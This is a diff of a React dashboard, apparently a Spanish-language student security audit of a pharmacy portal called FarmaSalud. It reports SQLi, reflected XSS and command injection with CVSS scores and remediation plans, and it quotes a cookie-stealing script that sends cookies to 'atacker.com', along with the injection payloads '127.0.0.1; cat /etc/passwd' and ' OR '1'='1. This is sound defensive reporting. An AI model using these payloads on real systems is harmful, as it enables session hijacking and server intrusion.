@@ -36,6 +36,14 @@ export default function Matriz() {
         nivel: 'ALTO (12)' 
       }
     };
+  
+  const getThreatVisorClass = (nivel) => {
+    if (!nivel) return '';
+    if (nivel.includes('CRÍTICO')) return 'visor-critical';
+    if (nivel.includes('ALTO')) return 'visor-high';
+    if (nivel.includes('MEDIO')) return 'visor-medium';
+    return '';
+  };
 
   return (
     <div className="cod-dashboard">
@@ -51,13 +59,14 @@ export default function Matriz() {
         </div>
       </header>
 
+
       <div className="cod-layout">
         {/* MENÚ DE SELECCIÓN LATERAL */}
         <aside className="cod-sidebar">
           <div className="sidebar-title">// SELECCIÓN DE MISIÓN</div>
           <nav className="cod-nav">
             <button className={`cod-nav-btn ${seccionActiva === 'resumen' ? 'active' : ''}`} onClick={() => setSeccionActiva('resumen')}>
-              <span className="btn-id">01</span> RESUMEN EJECUTIVO
+              <span className="btn-id">01</span> RESUMEN
             </button>
             <button className={`cod-nav-btn ${seccionActiva === 'sqli' ? 'active' : ''}`} onClick={() => setSeccionActiva('sqli')}>
               <span className="btn-id">02</span> INYECCIÓN SQL (SQLi)
@@ -75,7 +84,7 @@ export default function Matriz() {
               <span className="btn-id">06</span> MATRIZ DE RIESGO
             </button>
             <button className={`cod-nav-btn ${seccionActiva === 'controles' ? 'active' : ''}`} onClick={() => setSeccionActiva('controles')}>
-              <span className="btn-id">07</span> CUADRO DE CONTROLES
+              <span className="btn-id">07</span> CONTROLES DE SEGURIDAD
             </button>
             <button className={`cod-nav-btn ${seccionActiva === 'recuperacion' ? 'active' : ''}`} onClick={() => setSeccionActiva('recuperacion')}>
               <span className="btn-id">08</span> PLAN DE RECUPERACIÓN
@@ -92,7 +101,7 @@ export default function Matriz() {
           {/* 01 RESUMEN EJECUTIVO */}
           {seccionActiva === 'resumen' && (
             <div className="animate-fade">
-              <h2>01 // RESUMEN EJECUTIVO</h2>
+              <h2 className="cyber-title">01 // RESUMEN</h2>
               
               <div className="cod-card">
                 <h3>1. CONTEXTO DE LA EMPRESA AUDITADA</h3>
@@ -111,12 +120,12 @@ export default function Matriz() {
             </div>
           )}
 
-{/* 02 SQLI */}
+      {/* 02 SQLI */}
           {seccionActiva === 'sqli' && (
             <div className="animate-fade">
-              <h2>02 // REPORTES TÉCNICOS: INYECCIÓN SQL</h2>
+              <h2 className="cyber-title">02 // REPORTES TÉCNICOS: INYECCIÓN SQL</h2>
               
-              <div className="cod-card border-high">
+              <div className="cod-card border-high glow-border energy-pulse">
                 <div className="cod-alert-tag high">AMENAZA CRÍTICA DETECTADA</div>
                 <h3>1. EVIDENCIA DEL ATAQUE</h3>
                 <p>El ataque se ejecutó explotando el formulario de consulta de ID del Portal de Clientes de FarmaSalud mediante la inyección de una compuerta lógica maliciosa.</p>
@@ -197,14 +206,12 @@ export default function Matriz() {
             </div>
           )}
 
-
-
-{/* 03 XSS */}
+      {/* 03 XSS */}
 {seccionActiva === 'xss' && (
   <div className="animate-fade">
-    <h2>03 // REPORTES TÉCNICOS: CROSS-SITE SCRIPTING REFLEJADO</h2>
-    
-    <div className="cod-card border-medium">
+    <h2 className="cyber-title">03 // REPORTES TÉCNICOS: CROSS-SITE SCRIPTING REFLEJADO</h2>
+
+    <div className="cod-card">
       <div className="cod-alert-tag medium">AMENAZA DE RIESGO MODERADO</div>
       <h3>1. EVIDENCIA DEL ATAQUE</h3>
       <p>El ataque se ejecutó inyectando código de JavaScript malicioso en el campo de entrada del formulario de saludo del portal de clientes.</p>
@@ -213,77 +220,94 @@ export default function Matriz() {
       </div>
     </div>
 
-<div className="cod-card">
-  <h3>3. ANÁLISIS TÉCNICO: ¿POR QUÉ FUNCIONA EL PAYLOAD?</h3>
-  <p>
-    El atacante inyecta el script malicioso <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> en un campo de entrada. La aplicación, al no realizar <strong>Output Encoding</strong>, inserta este código directamente en el HTML de la respuesta.
-  </p>
-
-  <div className="cod-code-box">
-    {/* Representación de cómo el navegador recibe el HTML comprometido */}
-    <code>&lt;div&gt;Hola, &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/div&gt;</code>
-  </div>
-
-  <h4 style={{ marginTop: '20px' }}>DESGLOSE LÓGICO DEL ATAQUE:</h4>
-  <ul className="technical-list">
-    <li><strong>Etiqueta de Script:</strong> Al detectar <code>&lt;script&gt;</code>, el navegador de la víctima no lo trata como texto plano, sino como una instrucción ejecutable de JavaScript.</li>
-    <li><strong>Ejecución en el Cliente:</strong> El navegador interpreta el comando <code>alert('XSS')</code>, desplegando una ventana emergente. En un escenario real, esto podría ser un script que robe cookies de sesión o redirija al usuario.</li>
-    <li><strong>Falta de Sanitización:</strong> La vulnerabilidad reside en que el servidor web confía ciegamente en el input del usuario, permitiendo que caracteres especiales como <code>&lt;</code> y <code>&gt;</code> se rendericen como parte del código fuente de la página.</li>
-  </ul>
-</div>
-
-<div className="cod-card">
-  <h3>3. RESUMEN DEL PERFIL DE RIESGO: XSS REFLEJADO</h3>
-  
-  <div className="table-responsive">
-    <table className="cod-table">
-      <thead style={{ backgroundColor: '#222', color: '#fff' }}>
-        <tr>
-          <th>MÉTRICA</th>
-          <th>DESCRIPCIÓN TÉCNICA (XSS)</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr><td><strong>AV : N</strong></td><td>(Attack Vector - Network): El ataque es remoto, ejecutado a través del navegador de la víctima.</td></tr>
-        <tr><td><strong>AC : L</strong></td><td>(Attack Complexity - Low): No se requieren condiciones especiales; basta con enviar un enlace malicioso.</td></tr>
-        <tr><td><strong>PR : N</strong></td><td>(Privileges Required - None): El atacante no necesita autenticarse en el sistema.</td></tr>
-        <tr><td><strong>UI : R</strong></td><td>(User Interaction - Required): El ataque requiere que la víctima haga clic en un enlace o cargue la página.</td></tr>
-        <tr><td><strong>S : C</strong></td><td>(Scope - Changed): El impacto se propaga al contexto del navegador del usuario.</td></tr>
-        <tr><td><strong>C : L</strong></td><td>(Confidentiality - Low): Posible robo de cookies de sesión o información visible en pantalla.</td></tr>
-        <tr><td><strong>I : L</strong></td><td>(Integrity - Low): Posibilidad de modificar la apariencia de la página o realizar acciones.</td></tr>
-        <tr><td><strong>A : N</strong></td><td>(Availability - None): El ataque no afecta la disponibilidad del servidor.</td></tr>
-      </tbody>
-    </table>
-  </div>
-
-  <div style={{ marginTop: '20px', textAlign: 'center' }}>
-    <p style={{ fontFamily: 'monospace' }}>
-      <strong>VECTOR:</strong> <code style={{ backgroundColor: '#222', color: '#00ff00', padding: '5px 10px' }}>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</code>
-    </p>
-    <div className="severity-banner text-medium" style={{ display: 'inline-block', padding: '5px 15px', border: '2px solid #ffcc00' }}>
-      PUNTAJE BASE: 6.1 [MEDIA]
+    <div className="cod-card">
+      <h3>2. ANÁLISIS TÉCNICO: ¿POR QUÉ FUNCIONA EL PAYLOAD?</h3>
+      <p>El atacante inyecta el script malicioso <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> en un campo de entrada. La aplicación, al no realizar <strong>Output Encoding</strong>, inserta este código directamente en el HTML de la respuesta.</p>
+      <div className="cod-code-box">
+        <code>&lt;div&gt;Hola, &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/div&gt;</code>
+      </div>
+      <h4 style={{ marginTop: '20px' }}>DESGLOSE LÓGICO DEL ATAQUE:</h4>
+      <ul className="technical-list">
+        <li><strong>Etiqueta de Script:</strong> Al detectar <code>&lt;script&gt;</code>, el navegador de la víctima no lo trata como texto plano, sino como una instrucción ejecutable de JavaScript.</li>
+        <li><strong>Ejecución en el Cliente:</strong> El navegador interpreta el comando <code>alert('XSS')</code>, desplegando una ventana emergente. En un escenario real, esto podría ser un script que robe cookies de sesión o redirija al usuario.</li>
+        <li><strong>Falta de Sanitización:</strong> La vulnerabilidad reside en que el servidor web confía ciegamente en el input del usuario, permitiendo que caracteres especiales como <code>&lt;</code> y <code>&gt;</code> se rendericen como parte del código fuente de la página.</li>
+      </ul>
     </div>
-  </div>
-</div>
 
-<div className="cod-card">
-  <h3>4. ANÁLISIS DE IMPACTO: XSS REFLEJADO (CROSS-SITE SCRIPTING)</h3>
-  <p>
-    <strong>COMPROMISO DE LA SESIÓN DEL PACIENTE:</strong> Es el impacto principal. Al inyectar un script malicioso en la URL o campos de entrada, el atacante puede ejecutar código en el navegador del usuario legítimo.
-    <br/><br/>
-    <strong>Activos afectados:</strong> Cookies de sesión, tokens de autenticación, información visual del portal (datos de recetas) y credenciales almacenadas en el navegador.
-    <br/><br/>
-    <strong>Riesgo:</strong> Suplantación de identidad (Account Takeover). Un atacante puede robar la sesión activa del paciente y realizar compras o visualizar historiales médicos a su nombre. 
-    <br/><br/>
-    <strong>Medida de mitigación:</strong> Codificación de salida (Output Encoding) y políticas de seguridad de contenido (CSP).
-  </p>
-  
-  <div className="cod-code-box">
-    <code>{'// Ejemplo de ejecución en el cliente\n<script>fetch("https://atacker.com/steal?cookie=" + document.cookie);</script>'}</code>
-  </div>
-</div>
+    <div className="cod-card">
+      <h3>3. RESUMEN DEL PERFIL DE RIESGO: XSS REFLEJADO</h3>
+      <div style={{ overflowX: 'auto' }}>
+        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.9rem', tableLayout: 'fixed' }}>
+          <colgroup>
+            <col style={{ width: '20%' }} />
+            <col style={{ width: '80%' }} />
+          </colgroup>
+          <thead>
+            <tr style={{ backgroundColor: 'var(--cod-bg-dark)', color: '#fff' }}>
+              <th style={{ padding: '10px', textAlign: 'left' }}>MÉTRICA</th>
+              <th style={{ padding: '10px', textAlign: 'left' }}>DESCRIPCIÓN TÉCNICA (XSS)</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
+              <td style={{ padding: '10px' }}><strong>AV : N</strong></td>
+              <td style={{ padding: '10px' }}>(Attack Vector - Network): El ataque es remoto, ejecutado a través del navegador de la víctima.</td>
+            </tr>
+            <tr style={{ borderBottom: '1px solid var(--cod-border)', backgroundColor: '#f9fafb' }}>
+              <td style={{ padding: '10px' }}><strong>AC : L</strong></td>
+              <td style={{ padding: '10px' }}>(Attack Complexity - Low): No se requieren condiciones especiales; basta con enviar un enlace malicioso.</td>
+            </tr>
+            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
+              <td style={{ padding: '10px' }}><strong>PR : N</strong></td>
+              <td style={{ padding: '10px' }}>(Privileges Required - None): El atacante no necesita autenticarse en el sistema.</td>
+            </tr>
+            <tr style={{ borderBottom: '1px solid var(--cod-border)', backgroundColor: '#f9fafb' }}>
+              <td style={{ padding: '10px' }}><strong>UI : R</strong></td>
+              <td style={{ padding: '10px' }}>(User Interaction - Required): El ataque requiere que la víctima haga clic en un enlace o cargue la página.</td>
+            </tr>
+            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
+              <td style={{ padding: '10px' }}><strong>S : C</strong></td>
+              <td style={{ padding: '10px' }}>(Scope - Changed): El impacto se propaga al contexto del navegador del usuario.</td>
+            </tr>
+            <tr style={{ borderBottom: '1px solid var(--cod-border)', backgroundColor: '#f9fafb' }}>
+              <td style={{ padding: '10px' }}><strong>C : L</strong></td>
+              <td style={{ padding: '10px' }}>(Confidentiality - Low): Posible robo de cookies de sesión o información visible en pantalla.</td>
+            </tr>
+            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
+              <td style={{ padding: '10px' }}><strong>I : L</strong></td>
+              <td style={{ padding: '10px' }}>(Integrity - Low): Posibilidad de modificar la apariencia de la página o realizar acciones.</td>
+            </tr>
+            <tr>
+              <td style={{ padding: '10px' }}><strong>A : N</strong></td>
+              <td style={{ padding: '10px' }}>(Availability - None): El ataque no afecta la disponibilidad del servidor.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p style={{ marginTop: '15px', fontFamily: 'monospace' }}>
+        <strong>VECTOR:</strong> <code style={{ backgroundColor: '#222', color: '#00ff00', padding: '5px 10px' }}>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</code>
+      </p>
+      <div className="severity-banner text-medium" style={{ display: 'inline-block', padding: '5px 15px', border: '2px solid #ffcc00' }}>
+        PUNTAJE BASE: 6.1 [MEDIA]
+      </div>
+    </div>
 
-    {/* PUNTO 5: EVIDENCIA GRÁFICA */}
+    <div className="cod-card">
+      <h3>4. ANÁLISIS DE IMPACTO: XSS REFLEJADO</h3>
+      <p>
+        <strong>COMPROMISO DE LA SESIÓN DEL PACIENTE:</strong> Es el impacto principal. Al inyectar un script malicioso en la URL o campos de entrada, el atacante puede ejecutar código en el navegador del usuario legítimo.
+        <br/><br/>
+        <strong>Activos afectados:</strong> Cookies de sesión, tokens de autenticación, información visual del portal (datos de recetas) y credenciales almacenadas en el navegador.
+        <br/><br/>
+        <strong>Riesgo:</strong> Suplantación de identidad (Account Takeover). Un atacante puede robar la sesión activa del paciente y realizar compras o visualizar historiales médicos a su nombre.
+        <br/><br/>
+        <strong>Medida de mitigación:</strong> Codificación de salida (Output Encoding) y políticas de seguridad de contenido (CSP).
+      </p>
+      <div className="cod-code-box">
+        <code>{'// Ejemplo de ejecución en el cliente\n<script>fetch("https://atacker.com/steal?cookie=" + document.cookie);</script>'}</code>
+      </div>
+    </div>
+
     <div className="cod-card">
       <h3>5. REGISTRO DE EVIDENCIA GRÁFICA</h3>
       {xssImg ? (
@@ -293,18 +317,16 @@ export default function Matriz() {
       )}
       <span className="cod-intel-caption">// AS-01_XSS_TRACE.PNG</span>
     </div>
+
   </div>
 )}
 
-
-
-
-{/* 04 COMANDOS */}
+  {/* 04 COMANDOS */}
           {seccionActiva === 'comandos' && (
             <div className="animate-fade">
-              <h2>04 // REPORTES TÉCNICOS: INYECCIÓN DE COMANDOS</h2>
+              <h2 className="cyber-title">04 // REPORTES TÉCNICOS: INYECCIÓN DE COMANDOS</h2>
               
-              <div className="cod-card border-high">
+              <div className="cod-card border-high glow-border energy-pulse">
                 <div className="cod-alert-tag high">AMENAZA CRÍTICA DETECTADA</div>
                 <h3>1. EVIDENCIA DEL ATAQUE</h3>
                 <p>El ataque se realizó aprovechando un formulario de diagnóstico de red (herramienta de ping) integrado en el portal administrativo.</p>
@@ -365,7 +387,7 @@ export default function Matriz() {
           {/* 05 VALORACIÓN DE ACTIVOS */}
           {seccionActiva === 'activos' && (
             <div className="animate-fade">
-              <h2>05 // INVENTARIO Y VALORACIÓN DE ACTIVOS CRÍTICOS</h2>
+              <h2 className="cyber-title">05 // INVENTARIO Y VALORACIÓN DE ACTIVOS CRÍTICOS</h2>
               
               <div className="cod-card">
                 <h3>1. IDENTIFICACIÓN DE ACTIVOS</h3>
@@ -380,50 +402,58 @@ export default function Matriz() {
 
               <div className="cod-card">
                 <h3>2. MATRIZ DE VALORACIÓN CRÍTICA</h3>
-                <div className="table-responsive">
-                  <table className="cod-table">
+                <div style={{ overflowX: 'auto' }}>
+                  <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.9rem', tableLayout: 'fixed' }}>
+                    <colgroup>
+                      <col style={{ width: '8%' }} />
+                      <col style={{ width: '20%' }} />
+                      <col style={{ width: '14%' }} />
+                      <col style={{ width: '14%' }} />
+                      <col style={{ width: '14%' }} />
+                      <col style={{ width: '30%' }} />
+                    </colgroup>
                     <thead>
-                      <tr>
-                        <th>ID</th>
-                        <th>NOMBRE DEL ACTIVO</th>
-                        <th>CONFIDENCIALIDAD</th>
-                        <th>INTEGRIDAD</th>
-                        <th>DISPONIBILIDAD</th>
-                        <th>JUSTIFICACIÓN LEGAL / OPERATIVA</th>
+                      <tr style={{ backgroundColor: 'var(--cod-bg-dark)', color: '#fff' }}>
+                        <th style={{ padding: '10px', textAlign: 'left' }}>ID</th>
+                        <th style={{ padding: '10px', textAlign: 'left' }}>NOMBRE DEL ACTIVO</th>
+                        <th style={{ padding: '10px', textAlign: 'left' }}>CONFIDENCIALIDAD</th>
+                        <th style={{ padding: '10px', textAlign: 'left' }}>INTEGRIDAD</th>
+                        <th style={{ padding: '10px', textAlign: 'left' }}>DISPONIBILIDAD</th>
+                        <th style={{ padding: '10px', textAlign: 'left' }}>JUSTIFICACIÓN LEGAL / OPERATIVA</th>
                       </tr>
                     </thead>
                     <tbody>
-                      <tr>
-                        <td><strong>AD-01</strong></td>
-                        <td>Base de Datos de Salud (EHR)</td>
-                        <td className="table-cell-critica">ALTA (H)</td>
-                        <td className="table-cell-critica">ALTA (H)</td>
-                        <td className="table-cell-critica">ALTA (H)</td>
-                        <td>Ley de Protección de la Vida Privada (Datos Sensibles).</td>
+                      <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
+                        <td style={{ padding: '10px' }}><strong>AD-01</strong></td>
+                        <td style={{ padding: '10px' }}>Base de Datos de Salud (EHR)</td>
+                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
+                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
+                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
+                        <td style={{ padding: '10px' }}>Ley de Protección de la Vida Privada (Datos Sensibles).</td>
+                      </tr>
+                      <tr style={{ borderBottom: '1px solid var(--cod-border)', backgroundColor: '#f9fafb' }}>
+                        <td style={{ padding: '10px' }}><strong>AD-02</strong></td>
+                        <td style={{ padding: '10px' }}>Base de Datos de Clientes</td>
+                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
+                        <td style={{ padding: '10px' }}>MEDIA (M)</td>
+                        <td style={{ padding: '10px' }}>MEDIA (M)</td>
+                        <td style={{ padding: '10px' }}>Datos personales. Alto riesgo de phishing corporativo si se filtra.</td>
+                      </tr>
+                      <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
+                        <td style={{ padding: '10px' }}><strong>AD-03</strong></td>
+                        <td style={{ padding: '10px' }}>Datos de Tarjetas de Pago</td>
+                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
+                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
+                        <td style={{ padding: '10px' }}>MEDIA (M)</td>
+                        <td style={{ padding: '10px' }}>Regulado por estándares internacionales obligatorios PCI-DSS.</td>
                       </tr>
                       <tr>
-                        <td><strong>AD-02</strong></td>
-                        <td>Base de Datos de Clientes</td>
-                        <td className="table-cell-critica">ALTA (H)</td>
-                        <td>MEDIA (M)</td>
-                        <td>MEDIA (M)</td>
-                        <td>Datos personales. Alto riesgo de phishing corporativo si se filtra.</td>
-                      </tr>
-                      <tr>
-                        <td><strong>AD-03</strong></td>
-                        <td>Datos de Tarjetas de Pago</td>
-                        <td className="table-cell-critica">ALTA (H)</td>
-                        <td className="table-cell-critica">ALTA (H)</td>
-                        <td>MEDIA (M)</td>
-                        <td>Regulado por estándares internacionales obligatorios PCI-DSS.</td>
-                      </tr>
-                      <tr>
-                        <td><strong>AS-01</strong></td>
-                        <td>Portal de Clientes</td>
-                        <td>MEDIA (M)</td>
-                        <td className="table-cell-critica">ALTA (H)</td>
-                        <td className="table-cell-critica">ALTA (H)</td>
-                        <td>Canal de venta digital principal. Su caída paraliza la operación.</td>
+                        <td style={{ padding: '10px' }}><strong>AS-01</strong></td>
+                        <td style={{ padding: '10px' }}>Portal de Clientes</td>
+                        <td style={{ padding: '10px' }}>MEDIA (M)</td>
+                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
+                        <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>ALTA (H)</td>
+                        <td style={{ padding: '10px' }}>Canal de venta digital principal. Su caída paraliza la operación.</td>
                       </tr>
                     </tbody>
                   </table>
@@ -435,7 +465,7 @@ export default function Matriz() {
           {/* 06 MATRIZ DE RIESGO */}
           {seccionActiva === 'matriz_riesgo' && (
             <div className="animate-fade">
-              <h2>06 // MATRIZ DE RIESGO DE CIBERSEGURIDAD</h2>
+              <h2 className="cyber-title">06 // MATRIZ DE RIESGO DE CIBERSEGURIDAD</h2>
               
               <div className="cod-card">
                 <h3>1. MAPA DE CALOR OPERATIVO (PROBABILIDAD X IMPACTO)</h3>
@@ -476,7 +506,7 @@ export default function Matriz() {
                     </div>
                   </div>
 
-                  <div className="cod-threat-visor">
+                  <div className={`cod-threat-visor ${getThreatVisorClass(riesgoSeleccionado ? riesgosData[riesgoSeleccionado].nivel : '')}`}>
                     <div className="visor-header">// INTELIGENCIA DE AMENAZAS</div>
                     {riesgoSeleccionado ? (
                       <div className="visor-body animate-fade">
@@ -496,92 +526,403 @@ export default function Matriz() {
 
           {/* 07 CUADRO DE CONTROLES */}
           {seccionActiva === 'controles' && (
-            <div className="animate-fade">
-              <h2>07 // CUADRO DE MANDOS: CONTROLES DE SEGURIDAD</h2>
-              
-              <div className="cod-card">
-                <h3>MATRIZ DE IMPLEMENTACIÓN (DEFENSA EN PROFUNDIDAD)</h3>
-                <div className="table-responsive">
-                  <table className="cod-table">
-                    <thead>
-                      <tr>
-                        <th>ID CONTROL</th>
-                        <th>TIPO</th>
-                        <th>DESCRIPCIÓN TÉCNICA</th>
-                        <th>ESTADO OPERATIVO</th>
-                        <th>VULNERABILIDAD ASOCIADA</th>
-                      </tr>
-                    </thead>
-                    <tbody>
-                      <tr>
-                        <td><strong>CTRL-01</strong></td>
-                        <td>Preventivo</td>
-                        <td>Implementación de <strong>Consultas Parametrizadas (Prepared Statements)</strong> en todo el backend.</td>
-                        <td className="status-pending">PENDIENTE</td>
-                        <td>Inyección SQL (SQLi)</td>
-                      </tr>
-                      <tr>
-                        <td><strong>CTRL-02</strong></td>
-                        <td>Preventivo</td>
-                        <td>Activación de codificación de salida adaptativa al contexto (<strong>Output Encoding</strong>) en vistas.</td>
-                        <td className="status-pending">PENDIENTE</td>
-                        <td>XSS Reflejado</td>
-                      </tr>
-                      <tr>
-                        <td><strong>CTRL-03</strong></td>
-                        <td>Preventivo</td>
-                        <td>Prohibición absoluta de funciones de shell (<code>system()</code>), usando APIs de red nativas.</td>
-                        <td className="status-pending">PENDIENTE</td>
-                        <td>Inyección de Comandos</td>
-                      </tr>
-                      <tr>
-                        <td><strong>CTRL-04</strong></td>
-                        <td>Detectivo</td>
-                        <td>Despliegue de un <strong>Web Application Firewall (WAF)</strong> perimetral en producción.</td>
-                        <td className="status-planned">PLANIFICADO</td>
-                        <td>Transversal (SQLi, XSS, CmdInj)</td>
-                      </tr>
-                    </tbody>
-                  </table>
-                </div>
-              </div>
-            </div>
-          )}
-
+  <div className="animate-fade">
+    <h2 className="cyber-title">07 // CONTROLES DE SEGURIDAD</h2>
+    
+    <div className="cod-card">
+      <h3>MATRIZ DE IMPLEMENTACIÓN (DEFENSA EN PROFUNDIDAD)</h3>
+      <div style={{ overflowX: 'auto' }}>
+        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.9rem', tableLayout: 'fixed' }}>
+          <colgroup>
+            <col style={{ width: '12%' }} />
+            <col style={{ width: '12%' }} />
+            <col style={{ width: '38%' }} />
+            <col style={{ width: '16%' }} />
+            <col style={{ width: '22%' }} />
+          </colgroup>
+          <thead>
+            <tr style={{ backgroundColor: 'var(--cod-bg-dark)', color: '#fff' }}>
+              <th style={{ padding: '10px', textAlign: 'left' }}>ID CONTROL</th>
+              <th style={{ padding: '10px', textAlign: 'left' }}>TIPO</th>
+              <th style={{ padding: '10px', textAlign: 'left' }}>DESCRIPCIÓN TÉCNICA</th>
+              <th style={{ padding: '10px', textAlign: 'left' }}>ESTADO OPERATIVO</th>
+              <th style={{ padding: '10px', textAlign: 'left' }}>VULNERABILIDAD ASOCIADA</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
+              <td style={{ padding: '10px' }}><strong>CTRL-01</strong></td>
+              <td style={{ padding: '10px' }}>Preventivo</td>
+              <td style={{ padding: '10px' }}>Implementación de <strong>Consultas Parametrizadas (Prepared Statements)</strong> en todo el backend.</td>
+              <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>PENDIENTE</td>
+              <td style={{ padding: '10px' }}>Inyección SQL (SQLi)</td>
+            </tr>
+            <tr style={{ borderBottom: '1px solid var(--cod-border)', backgroundColor: '#f9fafb' }}>
+              <td style={{ padding: '10px' }}><strong>CTRL-02</strong></td>
+              <td style={{ padding: '10px' }}>Preventivo</td>
+              <td style={{ padding: '10px' }}>Activación de codificación de salida adaptativa al contexto (<strong>Output Encoding</strong>) en vistas.</td>
+              <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>PENDIENTE</td>
+              <td style={{ padding: '10px' }}>XSS Reflejado</td>
+            </tr>
+            <tr style={{ borderBottom: '1px solid var(--cod-border)' }}>
+              <td style={{ padding: '10px' }}><strong>CTRL-03</strong></td>
+              <td style={{ padding: '10px' }}>Preventivo</td>
+              <td style={{ padding: '10px' }}>Prohibición absoluta de funciones de shell (<code>system()</code>), usando APIs de red nativas.</td>
+              <td style={{ padding: '10px', color: 'var(--cod-critico)', fontWeight: 'bold' }}>PENDIENTE</td>
+              <td style={{ padding: '10px' }}>Inyección de Comandos</td>
+            </tr>
+            <tr>
+              <td style={{ padding: '10px' }}><strong>CTRL-04</strong></td>
+              <td style={{ padding: '10px' }}>Detectivo</td>
+              <td style={{ padding: '10px' }}>Despliegue de un <strong>Web Application Firewall (WAF)</strong> perimetral en producción.</td>
+              <td style={{ padding: '10px', color: 'var(--cod-alto)', fontWeight: 'bold' }}>PLANIFICADO</td>
+              <td style={{ padding: '10px' }}>Transversal (SQLi, XSS, CmdInj)</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+)}
           {/* 08 PLAN DE RECUPERACIÓN */}
-          {seccionActiva === 'recuperacion' && (
-            <div className="animate-fade">
-              <h2>08 // ESTRATEGIA Y PLAN DE RECUPERACIÓN ANTE DESASTRES</h2>
-              
-              <div className="cod-card">
-                <h3>1. PLAN DE ACCIÓN INMEDIATO (REMEDIACIÓN DE CÓDIGO)</h3>
-                <p><strong>Fase 1 [Bloqueo Crítico - Próximas 24 horas]:</strong> Parchear de forma prioritaria el fallo de Command Injection y reescribir las llamadas SQL de login a formato parametrizado.</p>
-                <p><strong>Fase 2 [Mitigación Web - Próximas 72 horas]:</strong> Desplegar parches XSS e inyectar cabeceras HTTP de seguridad (<code>Content-Security-Policy</code>).</p>
-              </div>
+{/* =====================================================
+    08 // PLAN DE RECUPERACIÓN — FARMASALUD
+    Reemplaza el bloque {seccionActiva === 'recuperacion'} 
+    en tu App.jsx con este contenido completo.
+    ===================================================== */}
 
-              <div className="cod-card">
-                <h3>2. PROTOCOLO DE RESPUESTA A INCIDENTES</h3>
-                <p><strong>Contención:</strong> Aislamiento de red inmediato del servidor comprometido para detener fugas de datos y revocación total de tokens activos en la base de datos.</p>
-                <p><strong>Erradicación:</strong> Reemplazar el backend web por la versión corregida desde el repositorio seguro de Git y restaurar bases de datos a partir de respaldos probados.</p>
-              </div>
-            </div>
-          )}
+{seccionActiva === 'recuperacion' && (
+  <div className="animate-fade">
+    <h2 className="cyber-title">08 // ESTRATEGIA Y PLAN DE RECUPERACIÓN ANTE DESASTRES</h2>
+
+    {/* CARD 1 — ESCENARIO DEL INCIDENTE */}
+    <div className="cod-card glow-border" style={{ textAlign: 'left' }}>
+      <h3>1. ESCENARIO DEL INCIDENTE — FARMASALUD VULNERADA</h3>
+      <p>
+        El Portal de Clientes de FarmaSalud fue comprometido mediante la explotación exitosa de
+        <strong> tres vulnerabilidades críticas</strong> identificadas en el ambiente de producción:
+      </p>
+      <br />
+      <p>
+        <span className="cod-alert-tag high">CRÍTICO</span>{' '}
+        <strong>Command Injection:</strong> El atacante ejecutó el payload{' '}
+        <code>127.0.0.1; cat /etc/passwd</code> en el formulario de diagnóstico de red,
+        obteniendo el archivo completo de usuarios del sistema operativo del servidor,
+        incluyendo <code>root</code>, <code>www-data</code> y el servidor <code>mysql</code>.
+        Esto representa <strong>control total del servidor backend</strong> de FarmaSalud.
+      </p>
+      <br />
+      <p>
+        <span className="cod-alert-tag high">CRÍTICO</span>{' '}
+        <strong>SQL Injection:</strong> Con el payload <code>{'\'  OR \'1\'=\'1'}</code> en el
+        campo de User ID, se extrajeron <strong>todos los registros de pacientes</strong> de la
+        base de datos sin autenticación: nombres, apellidos, recetas médicas, historial de compras
+        y datos del programa de fidelización.
+      </p>
+      <br />
+      <p>
+        <span className="cod-alert-tag medium">ALTO</span>{' '}
+        <strong>XSS Reflejado:</strong> El campo de nombre en el portal refleja input de usuario
+        sin sanitizar. Un atacante puede distribuir enlaces maliciosos con scripts embebidos para
+        robar <strong>cookies de sesión activas</strong> de clientes del portal.
+      </p>
+    </div>
+
+    {/* CARD 2 — PLAN DE ACCIÓN INMEDIATO */}
+    <div className="cod-card">
+      <h3>2. PLAN DE ACCIÓN INMEDIATO — REMEDIACIÓN DE CÓDIGO</h3>
+      <p>
+        <strong>Fase 1 — Bloqueo Crítico (primeras 24 horas):</strong>
+      </p>
+      <p>
+        Desconectar el Portal de Clientes de internet de forma inmediata y revocar todos los
+        tokens de sesión activos en la base de datos. Deshabilitar las funciones de ejecución de
+        sistema operativo (<code>exec()</code>, <code>shell_exec()</code>, <code>system()</code>)
+        en el backend. Reescribir todas las consultas SQL vulnerables a formato{' '}
+        <strong>Prepared Statements</strong>. Bloquear las IPs de origen del ataque en el
+        firewall perimetral y cambiar todas las credenciales del servidor comprometido.
+      </p>
+      <br />
